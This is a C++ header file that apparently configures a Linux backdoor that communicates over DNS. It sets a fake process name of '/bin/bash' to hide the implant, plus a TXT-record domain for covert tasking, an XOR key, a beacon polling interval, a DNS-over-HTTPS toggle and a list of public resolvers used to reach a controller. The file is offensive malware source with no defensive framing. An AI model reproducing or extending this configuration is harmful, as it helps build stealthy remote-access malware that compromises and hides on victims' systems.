#pragma once
#define FAKE_NAME "/bin/bash" // name of fake process linux
#define TXT_DOMAIN ""
#define XOR_PASSWORD "ttest"
#define MIN_POLL 300 // minium of 5 minutes 
#define MAX_POLL 360 // max of 6 minutes
#define MAGIC_HEADER "2163" // OPTIONAL TO CHANGE!! decoded to !c
#define USE_DOH 0

std::vector <std::string> doh_resolvers = {
	"1.1.1.1"
};

std::vector <std::string> dns_resolvers = {
	"1.1.1.1",
	"8.8.8.8",
	"64.6.64.6",
	"74.82.42.42",
	"1.0.0.1",
	"8.8.4.4",
	"9.9.9.10",
	"64.6.65.6",
	"77.88.8.1",
	"91.239.100.100",
	"89.233.43.71"
};
